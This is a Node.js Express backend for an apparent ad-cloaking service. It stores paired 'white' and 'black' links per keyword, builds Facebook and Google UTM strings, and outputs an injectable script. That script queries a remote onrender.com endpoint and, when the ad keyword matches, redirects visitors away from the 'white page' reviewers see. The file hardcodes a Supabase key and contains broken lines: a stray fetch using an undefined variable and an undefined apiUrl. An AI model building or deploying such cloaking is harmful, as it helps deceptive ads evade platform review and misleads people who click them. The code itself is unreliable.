const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Supabase configuration
const supabaseUrl = process.env.SUPABASE_URL || 'https://lzukjzmvcjugmfomajzx.supabase.co';
const supabaseKey = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6dWtqem12Y2p1Z21mb21hanp4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTU3Nzg1MzEsImV4cCI6MjA3MTM1NDUzMX0.TDsLMdiIIR3XjRUtlG_ylJo8LGN3feQoAtipdh1Imgg';
const supabase = createClient(supabaseUrl, supabaseKey);

// Generate UTM parameters
function generateUTM(campaignType, keyword) {
  const baseParams = `utm_source=${campaignType.toUpperCase()}&keyword=${keyword}`;
  
  if (campaignType === 'facebook') {
    return `${baseParams}&utm_campaign={{campaign.name}}|{{campaign.id}}&utm_medium={{adset.name}}|{{adset.id}}&utm_content={{ad.name}}|{{ad.id}}&utm_term={{placement}}`;
  } else if (campaignType === 'google') {
    return `${baseParams}&utm_campaign={campaignid}&utm_medium={network}&utm_content={adgroupid}&utm_term={keyword}`;
  }
  
  return baseParams;
}

// Generate verification script
function generateScript(keyword) {
  return `<script>
(function(){
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has('keyword')) {
    fetch('https://backend-jknh.onrender.com/api/check?keyword=' + urlParams.get('keyword'))
      .then(response => response.json())
      .then(data => {
        if (data.redirect && data.url) {
          window.location.replace(data.url);
        }
      })
      .catch(error => {
        console.log('Verification failed, staying on white page');
      });
  }
})();
</script>`;
}

// API Routes

// Create new configuration
app.post('/api/configs', async (req, res) => {
  try {
    const { keyword, whiteLink, blackLink, campaignType } = req.body;
    
    // Validate required fields
    if (!keyword || !whiteLink || !blackLink || !campaignType) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // Check if keyword already exists
    const { data: existing } = await supabase
      .from('link_configs')
      .select('*')
      .eq('keyword', keyword)
      .single();
    
    if (existing) {
      return res.status(400).json({ error: 'Keyword already exists' });
    }
    
    // Create new configuration
    const { data, error } = await supabase
      .from('link_configs')
      .insert([{
        keyword,
        white_link: whiteLink,
        black_link: blackLink,
        campaign_type: campaignType,
        created_at: new Date().toISOString()
      }])
      .select()
      .single();
    
    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ error: 'Database error' });
    }
    
    // Generate UTM and script
    const utm = generateUTM(campaignType, keyword);
    const script = generateScript(keyword);
    fetch('https://backend-jknh.onrender.com/api/check?keyword=' + urlParams.get('keyword'))

    
    res.json({
      config: {
        id: data.id,
        keyword: data.keyword,
        whiteLink: data.white_link,
        blackLink: data.black_link,
        campaignType: data.campaign_type,
        createdAt: data.created_at
      },
      utm,
      script,
      apiUrl
    });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get all configurations
app.get('/api/configs', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('link_configs')
      .select('*')
      .order('created_at', { ascending: false });
    
    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ error: 'Database error' });
    }
    
    const configs = data.map(item => ({
      id: item.id,
      keyword: item.keyword,
      whiteLink: item.white_link,
      blackLink: item.black_link,
      campaignType: item.campaign_type,
      createdAt: item.created_at
    }));
    
    res.json(configs);
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Delete configuration
app.delete('/api/configs/:id', async (req, res) => {
  try {
    const { id } = req.params;
    
    const { error } = await supabase
      .from('link_configs')
      .delete()
      .eq('id', id);
    
    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ error: 'Database error' });
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Check keyword and redirect (This is the main API endpoint)
app.get('/api/check', async (req, res) => {
  try {
    const { keyword } = req.query;
    
    if (!keyword) {
      return res.json({ redirect: false, message: 'No keyword provided' });
    }
    
    // Find configuration for this keyword
    const { data, error } = await supabase
      .from('link_configs')
      .select('*')
      .eq('keyword', keyword)
      .single();
    
    if (error || !data) {
      return res.json({ redirect: false, message: 'Keyword not found' });
    }
    
    // Return black link for redirect
    res.json({
      redirect: true,
      url: data.black_link,
      message: 'Keyword verified'
    });
  } catch (error) {
    console.error('Server error:', error);
    res.json({ redirect: false, message: 'Server error' });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📊 Dashboard: http://localhost:4200`);
  console.log(`🔗 API Docs: http://localhost:${PORT}/health`);
});

module.exports = app;
